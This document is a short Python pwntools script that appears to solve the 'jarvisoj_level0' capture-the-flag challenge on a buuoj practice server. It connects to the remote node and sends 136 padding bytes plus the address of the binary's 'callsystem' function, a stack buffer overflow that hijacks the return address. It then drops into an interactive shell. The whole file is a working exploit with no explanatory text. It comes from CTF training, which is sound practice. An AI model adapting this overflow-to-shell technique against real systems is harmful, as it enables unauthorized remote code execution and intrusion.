from pwn import *


def jarvisoj_level0(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level0'):
    target = remote('node5.buuoj.cn', 28474)
    target_elf = ELF(file_name)

    call_system_addr = p64(target_elf.symbols['callsystem'])

    payload = b'A' * 136
    payload += call_system_addr

    target.send(payload)

    target.interactive()


if __name__ == '__main__':
    jarvisoj_level0()
